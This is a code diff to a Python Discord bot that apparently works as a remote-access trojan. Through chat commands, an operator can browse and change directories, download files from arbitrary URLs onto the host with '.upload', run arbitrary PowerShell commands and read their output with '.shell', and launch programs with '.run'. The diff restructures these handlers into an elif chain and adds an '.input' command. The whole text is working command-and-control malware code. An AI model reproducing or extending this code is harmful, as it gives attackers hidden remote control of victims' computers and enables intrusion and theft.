@@ -133,17 +133,6 @@ async def on_message(message):
                     await message.reply(embed=embed)
                 case ".ping":
                     await message.reply(f"Pong! \n jk heres the latency: \n``{round(client.latency * 1000)}ms``")
-                case ".cd":
-                    directory = message.content[3:]
-                    try:
-                        os.chdir(directory)
-                        files = "\n".join(os.listdir())
-                        if files == "":
-                            files = "No Files Found"
-                        embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
-                    except:
-                        embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
-                    await message.reply(embed=embed) 
                 case ".ls":
                     files = "\n".join(os.listdir())
                     if files == "":
@@ -241,7 +230,7 @@ async def on_message(message):
                     embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
                     await message.reply(embed=embed)
 
-            if message.content.lower().startswith(".upload"):
+            elif message.content.lower().startswith(".upload"):
                 link = message.content[8:]
                 file = requests.get(link).content
                 with open(os.path.basename(link), "wb") as f:
@@ -249,7 +238,7 @@ async def on_message(message):
                 embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
                 await message.reply(embed=embed)
 
-            if message.content.lower().startswith(".shell"):
+            elif message.content.lower().startswith(".shell"):
                 command = message.content[7:]
                 output = subprocess.Popen(
                     ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
@@ -259,11 +248,31 @@ async def on_message(message):
                 embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
                 await message.reply(embed=embed)
 
-            if message.content.lower().startswith(".run"):
+            elif message.content.lower().startswith(".run"):
                 file = message.content[5:]
                 subprocess.Popen(file, shell=True)
                 embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
                 await message.reply(embed=embed)
+
+            elif message.content.lower().startswith(".cd"):
+                directory = message.content[4:]
+                try:
+                    os.chdir(directory)
+                    files = "\n".join(os.listdir())
+                    if files == "":
+                        files = "No Files Found"
+                    embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
+                except:
+                    embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
+                await message.reply(embed=embed) 
+
+
+            elif message.content.lower().startswith(".input"):
+                command = message.content[7:].split()
+                key1 = command[0]
+                key2 = command[1] if len(command) > 1 else ""
+                key3 = command[2] if len(command) > 2 else ""
+                await message.reply(key1 + " " + key2 + " " + key3)
 
         else:
             print("MESSAGE SENT WAS:", message.content, "BY :" , message.author,"IN :" , message.channel,)
